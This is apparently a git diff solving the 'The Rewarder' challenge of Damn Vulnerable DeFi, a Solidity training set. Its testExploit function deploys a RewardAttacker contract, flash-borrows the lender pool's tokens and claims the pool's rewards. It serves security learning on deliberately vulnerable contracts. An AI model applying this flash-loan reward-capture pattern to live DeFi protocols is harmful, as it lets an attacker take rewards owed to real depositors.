@@ -8,6 +8,7 @@ import {Vm} from "forge-std/Vm.sol";
 
 import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
 import {TheRewarderPool} from "../../../Contracts/the-rewarder/TheRewarderPool.sol";
+import {RewardAttacker} from "../../../Contracts/the-rewarder/RewardAttacker.sol";
 import {RewardToken} from "../../../Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../Contracts/the-rewarder/FlashLoanerPool.sol";
@@ -42,7 +43,7 @@ contract TheRewarder is DSTest {
         vm.label(alice, "Alice");
         vm.label(bob, "Bob");
         vm.label(charlie, "Charlie");
-        vm.label(david, "Charlie");
+        vm.label(david, "David");
         vm.label(attacker, "Attacker");
 
         dvt = new DamnValuableToken();
@@ -93,6 +94,24 @@ contract TheRewarder is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.warp(block.timestamp + 5 days); // 5 days
+
+        vm.startPrank(attacker);
+
+        RewardAttacker theRewardAttacker = new RewardAttacker(
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(dvt)
+        );
+
+        theRewardAttacker.borrow(TOKENS_IN_LENDER_POOL);
+
+        console.log(theRewarderPool.rewardToken().balanceOf(attacker));
+
+        theRewardAttacker.withdrawRewards();
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         testAfter();
